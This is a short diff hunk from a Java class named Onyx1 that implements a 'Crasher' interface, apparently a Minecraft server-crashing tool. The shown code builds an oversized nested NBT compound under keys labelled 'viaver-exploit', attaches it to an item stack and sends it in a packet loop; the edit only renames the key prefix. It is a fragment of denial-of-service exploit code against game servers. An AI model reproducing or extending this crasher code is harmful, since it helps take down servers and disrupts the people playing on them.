@@ -45,7 +45,7 @@ public class Onyx1 implements Crasher {
                     case "comp" -> {
                         CompoundTag finalComp = new CompoundTag();
 
-                        for (int j = 0; j < size; j++) comp.put("xynis-viaver-exploit" + j, finalComp);
+                        for (int j = 0; j < size; j++) comp.put("redsignal-viaver-exploit" + j, finalComp);
                         ItemStack is = new ItemStack(Items.CHERRY_CHEST_BOAT, 1, Optional.of(comp));
 
                         for (int i = 0; i < packets; i++)
